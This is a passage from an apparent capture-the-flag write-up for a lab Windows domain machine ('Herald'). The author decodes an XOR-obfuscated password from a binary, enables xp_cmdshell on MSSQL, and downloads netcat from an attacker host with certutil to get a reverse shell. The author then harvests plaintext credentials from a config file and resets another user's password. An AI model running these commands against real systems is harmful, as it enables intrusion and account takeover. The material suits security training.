+</span></span></code></pre></div><p>its worked lets the if we have any abuse</p><p><img src=/images/herald/image.png alt=image.png></p><p>we need to get helpdesk01 to get helper.guy</p><p>Lets download it and lets what is this !</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>cat README.txt 
+</span></span><span style=display:flex><span>HeapPwn Development Share
+</span></span><span style=display:flex><span>Use the dbconnect tool to test database connectivity.
+</span></span><span style=display:flex><span>Contact IT <span style=color:#ff7b72>if</span> you have issues.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>chmod +x dbconnect
+</span></span><span style=display:flex><span>./dbconect
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>================================================</span>
+</span></span><span style=display:flex><span>  dbconnect v1.2 — HeapPwn Internal <span style=color:#79c0ff>Tools</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>================================================</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Target  : SQL01.herald.htb
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Database: ProjectDB
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> User    : svc_mssql
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Connecting ...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> Authentication OK
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> Connected to database: ProjectDB
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Running startup checks ...
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>&gt;<span style=color:#ff7b72;font-weight:700>]</span> SELECT @@VERSION
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>&lt;<span style=color:#ff7b72;font-weight:700>]</span> Query executed <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>0</span> rows affected<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>&gt;<span style=color:#ff7b72;font-weight:700>]</span> SELECT name FROM sys.databases
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>&lt;<span style=color:#ff7b72;font-weight:700>]</span> Query executed <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>0</span> rows affected<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> All checks passed. Exiting.
+</span></span></code></pre></div><p>lets check strings</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>strings dbconnect
+</span></span></code></pre></div><p><img src=/images/herald/image%201.png alt=image.png></p><p>This immediately reveals:</p><ul><li>A target hostname: <code>SQL01.herald.htb</code></li><li>A database name: <code>ProjectDB</code></li><li>A service account username: <code>svc_mssql</code></li></ul><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>file dbconnect
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>dbconnect: ELF 64-bit LSB pie executable, x86-64, version <span style=color:#a5d6ff>1</span> <span style=color:#ff7b72;font-weight:700>(</span>SYSV<span style=color:#ff7b72;font-weight:700>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style=color:#ff7b72;font-weight:700>[</span>sha1<span style=color:#ff7b72;font-weight:700>]=</span>a2ebf79d1dc51c52f64f5af9f9628d84c18ebf54, <span style=color:#ff7b72>for</span> GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>checksec --file<span style=color:#ff7b72;font-weight:700>=</span>dbconnect
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Checking <span style=color:#ff7b72>for</span> new versions of pwntools
+</span></span><span style=display:flex><span>    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.13/update to <span style=color:#a5d6ff>&#39;never&#39;</span> <span style=color:#ff7b72;font-weight:700>(</span>old way<span style=color:#ff7b72;font-weight:700>)</span>.
+</span></span><span style=display:flex><span>    Or add the following lines to ~/.pwn.conf or /home/kali/.config/pwn.conf <span style=color:#ff7b72;font-weight:700>(</span>or /etc/pwn.conf system-wide<span style=color:#ff7b72;font-weight:700>)</span>:
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72;font-weight:700>[</span>update<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>        <span style=color:#79c0ff>interval</span><span style=color:#ff7b72;font-weight:700>=</span>never
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> You have the latest version of Pwntools <span style=color:#ff7b72;font-weight:700>(</span>4.15.0<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#a5d6ff>&#39;/home/kali/Downloads/dbconnect&#39;</span>
+</span></span><span style=display:flex><span>    Arch:       amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:      Partial RELRO
+</span></span><span style=display:flex><span>    Stack:      No canary found
+</span></span><span style=display:flex><span>    NX:         NX enabled
+</span></span><span style=display:flex><span>    PIE:        PIE enabled
+</span></span><span style=display:flex><span>    Stripped:   No
+</span></span></code></pre></div><p>Check for PIE, NX, stack canaries — relevant if exploitation is required, not just credential extraction.</p><p>Load into IDA / Ghidra</p><p>Navigate to the <strong>Functions</strong> list and identify interesting names:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>decrypt_pass
+</span></span><span style=display:flex><span>db_connect
+</span></span><span style=display:flex><span>print_banner
+</span></span><span style=display:flex><span>run_query
+</span></span><span style=display:flex><span>main
+</span></span></code></pre></div><p>The name <code>decrypt_pass</code> is an immediate red flag.
+Analyse <code>decrypt_pass()</code></p><p>Decompiled output:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>__int64 __fastcall decrypt_pass<span style=color:#ff7b72;font-weight:700>(</span>__int64 a1<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>{</span>
+</span></span><span style=display:flex><span>  unsigned __int64 i;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>for</span> <span style=color:#ff7b72;font-weight:700>(</span> <span style=color:#79c0ff>i</span> <span style=color:#ff7b72;font-weight:700>=</span> 0; i &lt;<span style=color:#ff7b72;font-weight:700>=</span> 0xF; ++i <span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>    *<span style=color:#ff7b72;font-weight:700>(</span>_BYTE *<span style=color:#ff7b72;font-weight:700>)(</span>a1 + i<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>=</span> enc_pass<span style=color:#ff7b72;font-weight:700>[</span>i<span style=color:#ff7b72;font-weight:700>]</span> ^ 0x42;
+</span></span><span style=display:flex><span>  *<span style=color:#ff7b72;font-weight:700>(</span>_BYTE *<span style=color:#ff7b72;font-weight:700>)(</span>a1 + 16<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>=</span> 0;
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>return</span> a1 + 16;
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>}</span>
+</span></span></code></pre></div><p><strong>What this tells us:</strong></p><ul><li>Iterates over 16 bytes (0x0 to 0xF)</li><li>Each byte is XOR'd with the constant key <code>0x42</code></li><li>Result is null-terminated at index 16</li><li>Source data is a global array called <code>enc_pass</code></li></ul><p><strong>XOR encryption with a static single-byte key is trivially reversible.</strong></p><p>Since XOR is symmetric: <code>cipher ^ key = plain</code> and <code>plain ^ key = cipher</code>.</p><p>Locate <code>enc_pass[]</code>
+navigate to the <code>.data</code> segment or follow the reference from <code>decrypt_pass</code>. The global is declared as:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>_BYTE enc_pass<span style=color:#ff7b72;font-weight:700>[</span>16<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#ff7b72;font-weight:700>{</span> 49, 52, 33, 15, 49, 49, 51, 46, 2, 10, 113, 48, 35, 46, 38, <span style=color:#a5d6ff>99</span> <span style=color:#ff7b72;font-weight:700>}</span>;
+</span></span></code></pre></div><p>These are 16 decimal byte values. This is the encrypted password blob.
+<strong>Analyse <code>db_connect()</code></strong></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>__int64 db_connect<span style=color:#ff7b72;font-weight:700>()</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>{</span>
+</span></span><span style=display:flex><span>  char s<span style=color:#ff7b72;font-weight:700>[</span>32<span style=color:#ff7b72;font-weight:700>]</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  decrypt_pass<span style=color:#ff7b72;font-weight:700>((</span>__int64<span style=color:#ff7b72;font-weight:700>)</span>s<span style=color:#ff7b72;font-weight:700>)</span>;
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>if</span> <span style=color:#ff7b72;font-weight:700>(</span> strlen<span style=color:#ff7b72;font-weight:700>(</span>s<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#a5d6ff>16</span> <span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72;font-weight:700>{</span>
+</span></span><span style=display:flex><span>    puts<span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;[+] Authentication OK&#34;</span><span style=color:#ff7b72;font-weight:700>)</span>;
+</span></span><span style=display:flex><span>    printf<span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;[+] Connected to database: %s\n&#34;</span>, <span style=color:#a5d6ff>&#34;ProjectDB&#34;</span><span style=color:#ff7b72;font-weight:700>)</span>;
+</span></span><span style=display:flex><span>    memset<span style=color:#ff7b72;font-weight:700>(</span>s, 0, 0x11u<span style=color:#ff7b72;font-weight:700>)</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> 0;
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72;font-weight:700>}</span>
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>else</span>
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72;font-weight:700>{</span>
+</span></span><span style=display:flex><span>    memset<span style=color:#ff7b72;font-weight:700>(</span>s, 0, 0x11u<span style=color:#ff7b72;font-weight:700>)</span>;
+</span></span><span style=display:flex><span>    fwrite<span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;[-] Connection failed: invalid credentials\n&#34;</span>, ...<span style=color:#ff7b72;font-weight:700>)</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> 1;
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72;font-weight:700>}</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>}</span>
+</span></span></code></pre></div><ul><li>Password is decrypted onto the <strong>stack</strong> (<code>char s[32]</code>)</li><li>Validation is only a <code>strlen</code> check , the decrypted result must be exactly 16 chars</li><li><code>memset</code> attempts to wipe the buffer after use — this can be a dead store and <strong>optimized away</strong> by the compiler (security anti-pattern)</li><li>No actual database connection occurs</li></ul><p>solver python</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#79c0ff>enc_pass</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#ff7b72;font-weight:700>[</span>49, 52, 33, 15, 49, 49, 51, 46, 2, 10, 113, 48, 35, 46, 38, 99<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>password</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#34;&#34;</span>.join<span style=color:#ff7b72;font-weight:700>(</span>chr<span style=color:#ff7b72;font-weight:700>(</span>b ^ 0x42<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72>for</span> b in enc_pass<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print<span style=color:#ff7b72;font-weight:700>(</span>f<span style=color:#a5d6ff>&#34;Password: {password}&#34;</span><span style=color:#ff7b72;font-weight:700>)</span>
+</span></span></code></pre></div><p>now we got svc_mssql and svcMssql@H3rald!</p><p>lets login !!</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-mssqlclient svc_mssql:<span style=color:#a5d6ff>&#39;svcMssql@H3rald!&#39;</span>@10.0.12.3
+</span></span><span style=display:flex><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Encryption required, switching to TLS
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> ENVCHANGE<span style=color:#ff7b72;font-weight:700>(</span>DATABASE<span style=color:#ff7b72;font-weight:700>)</span>: Old Value: master, New Value: master
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> ENVCHANGE<span style=color:#ff7b72;font-weight:700>(</span>LANGUAGE<span style=color:#ff7b72;font-weight:700>)</span>: Old Value: , New Value: us_english
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> ENVCHANGE<span style=color:#ff7b72;font-weight:700>(</span>PACKETSIZE<span style=color:#ff7b72;font-weight:700>)</span>: Old Value: 4096, New Value: <span style=color:#a5d6ff>16192</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> INFO<span style=color:#ff7b72;font-weight:700>(</span>DC01<span style=color:#79c0ff>\S</span>QLEXPRESS<span style=color:#ff7b72;font-weight:700>)</span>: Line 1: Changed database context to <span style=color:#a5d6ff>&#39;master&#39;</span>.
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> INFO<span style=color:#ff7b72;font-weight:700>(</span>DC01<span style=color:#79c0ff>\S</span>QLEXPRESS<span style=color:#ff7b72;font-weight:700>)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> ACK: Result: <span style=color:#a5d6ff>1</span> - Microsoft SQL Server <span style=color:#a5d6ff>2019</span> RTM <span style=color:#ff7b72;font-weight:700>(</span>15.0.2000<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>!<span style=color:#ff7b72;font-weight:700>]</span> Press help <span style=color:#ff7b72>for</span> extra shell commands
+</span></span><span style=display:flex><span>SQL <span style=color:#ff7b72;font-weight:700>(</span>svc_mssql  dbo@master<span style=color:#ff7b72;font-weight:700>)</span>&gt; 
+</span></span></code></pre></div><p>lets try enable xp cmd shell</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>SQL <span style=color:#ff7b72;font-weight:700>(</span>svc_mssql  dbo@master<span style=color:#ff7b72;font-weight:700>)</span>&gt; enable_xp_cmdshell
+</span></span><span style=display:flex><span>INFO<span style=color:#ff7b72;font-weight:700>(</span>DC01<span style=color:#79c0ff>\S</span>QLEXPRESS<span style=color:#ff7b72;font-weight:700>)</span>: Line 185: Configuration option <span style=color:#a5d6ff>&#39;show advanced options&#39;</span> changed from <span style=color:#a5d6ff>1</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style=display:flex><span>INFO<span style=color:#ff7b72;font-weight:700>(</span>DC01<span style=color:#79c0ff>\S</span>QLEXPRESS<span style=color:#ff7b72;font-weight:700>)</span>: Line 185: Configuration option <span style=color:#a5d6ff>&#39;xp_cmdshell&#39;</span> changed from <span style=color:#a5d6ff>1</span> to 1. Run the RECONFIGURE statement to install.
+</span></span></code></pre></div><p>its enabled !!</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>SQL <span style=color:#ff7b72;font-weight:700>(</span>svc_mssql  dbo@master<span style=color:#ff7b72;font-weight:700>)</span>&gt; xp_cmdshell whoami
+</span></span><span style=display:flex><span>output             
+</span></span><span style=display:flex><span>----------------   
+</span></span><span style=display:flex><span>herald<span style=color:#79c0ff>\s</span>vc_mssql
+</span></span></code></pre></div><p>upload netcat to get reverse shell</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#a5d6ff>4444</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>xp_cmdshell <span style=color:#a5d6ff>&#34;certutil -urlcache -split -f http://10.0.12.4/nc64.exe C:\Windows\Temp\nc64.exe&#34;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -m http.server <span style=color:#a5d6ff>80</span>
+</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#a5d6ff>80</span> <span style=color:#ff7b72;font-weight:700>(</span>http://0.0.0.0:80/<span style=color:#ff7b72;font-weight:700>)</span> ...
+</span></span><span style=display:flex><span>10.0.12.3 - - <span style=color:#ff7b72;font-weight:700>[</span>13/Apr/2026 18:43:25<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#a5d6ff>&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span style=color:#a5d6ff>200</span> -
+</span></span></code></pre></div><p>lets c: files</p><p>we saw MyProject2026</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#79c0ff>\M</span>yProject2026&gt;dir /a
+</span></span><span style=display:flex><span>dir /a
+</span></span><span style=display:flex><span> Volume in drive C has no label.
+</span></span><span style=display:flex><span> Volume Serial Number is EC4E-06A9
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> Directory of C:<span style=color:#79c0ff>\M</span>yProject2026
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>04/13/2026  12:20 PM    &lt;DIR&gt;          .
+</span></span><span style=display:flex><span>04/13/2026  12:20 PM    &lt;DIR&gt;          ..
+</span></span><span style=display:flex><span>04/13/2026  12:21 PM    &lt;DIR&gt;          .config
+</span></span><span style=display:flex><span>04/13/2026  12:20 PM    &lt;DIR&gt;          logs
+</span></span><span style=display:flex><span>               <span style=color:#a5d6ff>0</span> File<span style=color:#ff7b72;font-weight:700>(</span>s<span style=color:#ff7b72;font-weight:700>)</span>              <span style=color:#a5d6ff>0</span> bytes
+</span></span><span style=display:flex><span>               <span style=color:#a5d6ff>4</span> Dir<span style=color:#ff7b72;font-weight:700>(</span>s<span style=color:#ff7b72;font-weight:700>)</span>  37,621,669,888 bytes free
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#79c0ff>\M</span>yProject2026&gt;cd .config
+</span></span><span style=display:flex><span>cd .config
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#79c0ff>\M</span>yProject2026<span style=color:#79c0ff>\.</span>config&gt;dir
+</span></span><span style=display:flex><span>dir
+</span></span><span style=display:flex><span> Volume in drive C has no label.
+</span></span><span style=display:flex><span> Volume Serial Number is EC4E-06A9
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> Directory of C:<span style=color:#79c0ff>\M</span>yProject2026<span style=color:#79c0ff>\.</span>config
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>File Not Found
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#79c0ff>\M</span>yProject2026<span style=color:#79c0ff>\.</span>config&gt;dir /a
+</span></span><span style=display:flex><span>dir /a
+</span></span><span style=display:flex><span> Volume in drive C has no label.
+</span></span><span style=display:flex><span> Volume Serial Number is EC4E-06A9
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> Directory of C:<span style=color:#79c0ff>\M</span>yProject2026<span style=color:#79c0ff>\.</span>config
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>04/13/2026  12:21 PM    &lt;DIR&gt;          .
+</span></span><span style=display:flex><span>04/13/2026  12:21 PM    &lt;DIR&gt;          ..
+</span></span><span style=display:flex><span>04/13/2026  02:37 PM               <span style=color:#a5d6ff>330</span> settings.ini
+</span></span><span style=display:flex><span>               <span style=color:#a5d6ff>1</span> File<span style=color:#ff7b72;font-weight:700>(</span>s<span style=color:#ff7b72;font-weight:700>)</span>            <span style=color:#a5d6ff>330</span> bytes
+</span></span><span style=display:flex><span>               <span style=color:#a5d6ff>2</span> Dir<span style=color:#ff7b72;font-weight:700>(</span>s<span style=color:#ff7b72;font-weight:700>)</span>  37,621,604,352 bytes free
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#79c0ff>\M</span>yProject2026<span style=color:#79c0ff>\.</span>config&gt;type settings.ini
+</span></span><span style=display:flex><span>type settings.ini
+</span></span><span style=display:flex><span>; HeapPwn Project Configuration
+</span></span><span style=display:flex><span>; Last updated: 2026-01-15
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>database<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>host</span>     <span style=color:#ff7b72;font-weight:700>=</span> SQL01.herald.htb
+</span></span><span style=display:flex><span><span style=color:#79c0ff>port</span>     <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1433</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>name</span>     <span style=color:#ff7b72;font-weight:700>=</span> ProjectDB
+</span></span><span style=display:flex><span><span style=color:#79c0ff>timeout</span>  <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>30</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>helpdesk<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>username</span> <span style=color:#ff7b72;font-weight:700>=</span> helpdesk01
+</span></span><span style=display:flex><span><span style=color:#79c0ff>password</span> <span style=color:#ff7b72;font-weight:700>=</span> !Vz3@Nk8#Lw2<span style=color:#79c0ff>$Xm6</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>domain</span>   <span style=color:#ff7b72;font-weight:700>=</span> HERALD
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>app<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>debug</span>    <span style=color:#ff7b72;font-weight:700>=</span> false
+</span></span><span style=display:flex><span><span style=color:#79c0ff>version</span>  <span style=color:#ff7b72;font-weight:700>=</span> 2.1.4
+</span></span><span style=display:flex><span><span style=color:#79c0ff>log_path</span> <span style=color:#ff7b72;font-weight:700>=</span> C:<span style=color:#79c0ff>\M</span>yProject2026<span style=color:#79c0ff>\l</span>ogs<span style=color:#79c0ff>\a</span>pp.log
+</span></span></code></pre></div><p>login with winrm</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>evil-winrm -i 10.0.12.3 -u helpdesk01 -p <span style=color:#a5d6ff>&#39;!Vz3@Nk8#Lw2$Xm6&#39;</span>
+</span></span></code></pre></div><p>change the password for helper.guy</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>net rpc password <span style=color:#a5d6ff>&#34;helper.guy&#34;</span> <span style=color:#a5d6ff>&#34;NewPass123!&#34;</span> -U <span style=color:#a5d6ff>&#34;HERALD&#34;</span>/<span style=color:#a5d6ff>&#34;helpdesk01&#34;</span>%<span style=color:#a5d6ff>&#39;!Vz3@Nk8#Lw2$Xm6&#39;</span> -S <span style=color:#a5d6ff>&#34;10.0.12.3&#34;</span>
+</span></span></code></pre></div><p>lets login with winrm for helper.guy</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>evil-winrm -i 10.0.12.3 -u helper.guy -p <span style=color:#a5d6ff>&#39;NewPass123!&#39;</span>
+</span></span></code></pre></div><p>after search in system we didnt get anything so lets see interesting services if working</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>netstat -ano -p tcp
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  TCP    10.0.12.3:1433         10.0.12.4:54896        ESTABLISHED     <span style=color:#a5d6ff>5308</span>
+</span></span><span style=display:flex><span>  TCP    10.0.12.3:5985         10.0.12.4:43718        ESTABLISHED     <span style=color:#a5d6ff>4</span>
+</span></span><span style=display:flex><span>  TCP    10.0.12.3:8086         10.0.12.3:55894        ESTABLISHED     <span style=color:#a5d6ff>940</span>
+</span></span><span style=display:flex><span>  TCP    10.0.12.3:52733        98.66.133.186:443      ESTABLISHED     <span style=color:#a5d6ff>2600</span>
+</span></span><span style=display:flex><span>  TCP    10.0.12.3:52736        98.66.133.186:443      ESTABLISHED     <span style=color:#a5d6ff>2600</span>
+</span></span><span style=display:flex><span>  TCP    10.0.12.3:55857        10.0.12.4:4444         ESTABLISHED     <span style=color:#a5d6ff>5692</span>
+</span></span><span style=display:flex><span>  TCP    10.0.12.3:55894        10.0.12.3:8086         ESTABLISHED     <span style=color:#a5d6ff>4308</span>
+</span></span><span style=display:flex><span>  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       <span style=color:#a5d6ff>2684</span>
